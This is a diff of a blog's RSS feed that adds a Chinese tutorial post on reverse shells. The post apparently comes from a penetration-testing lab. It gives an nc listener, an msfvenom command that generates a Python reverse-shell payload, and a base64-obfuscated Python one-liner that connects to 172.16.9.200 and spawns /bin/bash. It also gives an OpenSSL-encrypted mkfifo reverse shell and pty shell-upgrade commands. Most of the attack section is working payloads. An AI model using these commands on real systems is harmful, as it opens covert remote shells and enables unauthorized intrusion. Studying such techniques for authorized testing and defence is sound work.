+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 2222&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;我们直接可以使用&lt;strong&gt; msfvenom -l&lt;/strong&gt; 结合关键字过滤（如 = cmd/unix/reverse），列出我们需要生成的各类反弹 shell 一句话的 payload：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -l payloads | grep &amp;#x27;cmd/unix/reverse&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;生成一个 python 反弹 shell 的一句话&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p cmd/unix/reverse_python LHOST=172.16.9.200 LPORT=3333 -f raw &amp;gt; shell.py&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat shell.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;将 shell.py 内容复制到目标主机进行执行&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514154549401.png&#34; alt=&#34;image-20210514154549401&#34;&gt;&lt;/p&gt;
+&lt;p&gt;目标主机执行&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -c &lt;span class=&#34;string&#34;&gt;&amp;quot;exec(__import__(&amp;#x27;base64&amp;#x27;).b64decode(__import__(&amp;#x27;codecs&amp;#x27;).getencoder(&amp;#x27;utf-8&amp;#x27;)(&amp;#x27;aW1wb3J0IHNvY2tldCAgICAgICAgLCAgICAgc3VicHJvY2VzcyAgICAgICAgLCAgICAgb3MgIDsgICAgICAgICBob3N0PSIxNzIuMTYuOS4yMDAiICA7ICAgICAgICAgcG9ydD0yMjIyICA7ICAgICAgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAgICAgICAsICAgICBzb2NrZXQuU09DS19TVFJFQU0pICA7ICAgICAgICAgcy5jb25uZWN0KChob3N0ICAgICAgICAsICAgICBwb3J0KSkgIDsgICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICwgICAgIDApICA7ICAgICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAsICAgICAxKSAgOyAgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgLCAgICAgMikgIDsgICAgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=&amp;#x27;)[0]))&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;实现效果&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514154730993.png&#34; alt=&#34;image-20210514154730993&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514154739869.png&#34; alt=&#34;image-20210514154739869&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;利用openssl反弹加密shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用openssl反弹加密shell&#34;&gt;#&lt;/a&gt; 利用 OpenSSL 反弹加密 shell&lt;/h3&gt;
+&lt;p&gt;如果我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。&lt;/p&gt;
+&lt;p&gt;首先在攻击机 kali 生成自签名证书&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514160946360.png&#34; alt=&#34;image-20210514160946360&#34;&gt;&lt;/p&gt;
+&lt;p&gt;利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;openssl s_server -quiet -key key.pem -cert cert.pem -port 2222&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;目标机进行反弹 shell 操作&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mkfifo /tmp/s; /bin/sh -i &amp;lt; /tmp/s 2&amp;gt;&amp;amp;1 | openssl s_client -quiet -connect 172.16.9.200:2222 &amp;gt; /tmp/s; rm /tmp/s&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514161122042.png&#34; alt=&#34;image-20210514161122042&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514161128816.png&#34; alt=&#34;image-20210514161128816&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;扩展反弹shell后获取终端&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#扩展反弹shell后获取终端&#34;&gt;#&lt;/a&gt; 扩展反弹 shell 后获取终端&lt;/h3&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/bin/bash -i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo os.system(&amp;quot;/bin/bash&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://chungod.github.io/2021/05/05/%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/</guid>
             <title>溯源取证总结</title>
@@ -1272,9 +1423,9 @@
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://chungod.github.io/2021/04/10/linux%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/</guid>
+            <guid isPermalink="true">http://chungod.github.io/2021/04/10/Linux%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/</guid>
             <title>Linux提权</title>
-            <link>http://chungod.github.io/2021/04/10/linux%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/</link>
+            <link>http://chungod.github.io/2021/04/10/Linux%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/</link>
             <category>Linux提权</category>
             <pubDate>Sat, 10 Apr 2021 10:24:41 +0800</pubDate>
             <description><![CDATA[ &lt;h2 id=&#34;linux提权笔记&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux提权笔记&#34;&gt;#&lt;/a&gt; linux 提权笔记&lt;/h2&gt;
